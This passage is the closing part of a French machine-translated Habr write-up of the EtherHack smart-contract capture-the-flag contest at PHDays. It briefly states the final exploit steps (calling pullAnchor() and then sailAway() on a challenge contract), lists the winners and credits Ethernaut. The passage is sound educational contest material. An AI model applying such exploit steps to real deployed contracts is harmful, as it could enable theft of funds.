 3f ;;  ordure </pre><br>  Si nous appelons maintenant la fonction pullAnchor (), ce contrat sera immédiatement détruit, car nous n'avons plus de contrôle sur block.number.  Après cela, nous appelons la fonction sailAway () et célébrons la victoire! <br><br><h2>  Résultats </h2><br><ol><li>  Première place et diffusion d'un montant équivalent à 1 000 dollars américains: Alexey Pertsev (p4lex) </li><li>  Deuxième place et Ledger Nano S: Alexey Markov </li><li>  Troisième place et souvenirs PHDays: Alexander Vlasov </li></ol><br>  Tous les résultats: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">etherhack.positive.com/#/scoreboard</a> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d88/d86/955/d88d8695572199f7e3d800f34deb18ee.jpg" alt="image"><br><br>  Félicitations aux gagnants et merci à tous les participants! <br><br>  PS Merci à <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Zeppelin d'</a> avoir <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">rendu le</a> code source de la plateforme <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Ethernaut CTF</a> open source. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr414959/">https://habr.com/ru/post/fr414959/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr414945/index.html">L'Université Johns Hopkins a créé une peau artificielle qui ressent de la douleur</a></li>
<li><a href="../fr414947/index.html">Obtenir Git pour Windows sous ReactOS</a></li>
<li><a href="../fr414951/index.html">Gestion des accès dans Expressjs avec CASL</a></li>
<li><a href="../fr414953/index.html">Nvidia a appris au réseau neuronal à ralentir la vidéo</a></li>
<li><a href="../fr414955/index.html">Les entreprises ont utilisé le mot blockchain pour augmenter la capitalisation. Aidé pendant un certain temps</a></li>
<li><a href="../fr414961/index.html">Présentation de SERM</a></li>
<li><a href="../fr414963/index.html">Une solution de contournement a été trouvée pour contourner la protection par mot de passe sur iPhone / iPad. Pas vraiment</a></li>
<li><a href="../fr414965/index.html">«Protection du droit d'auteur dans l'UE»: la nouvelle réforme pourrait non seulement affecter les plateformes médiatiques</a></li>
<li><a href="../fr414967/index.html">Comment réduire le temps de construction d'un projet à l'aide du plug-in de performances Firebase</a></li>
<li><a href="../fr414969/index.html">Extension du processus de génération avec MSBuild</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>